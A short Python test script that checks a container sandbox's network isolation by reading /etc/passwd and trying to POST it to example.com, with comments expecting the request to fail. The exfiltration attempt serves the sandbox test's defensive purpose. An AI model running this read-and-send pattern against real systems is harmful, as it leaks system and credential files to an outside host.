# TESTS: the network namespace.
# EXPECT: URLError / "Temporary failure in name resolution" — it can't even
#         resolve a hostname, let alone send data.
# WHY IT FAILS: the container has its own network namespace containing only
# loopback. The internet isn't blocked — from in here, it doesn't exist.
import urllib.request
secret = open("/etc/passwd").read()          # (the container's fake one)
print("trying to exfiltrate", len(secret), "bytes...", flush=True)
urllib.request.urlopen("https://example.com", data=secret.encode(), timeout=5)
print("SENT — the sandbox is broken")
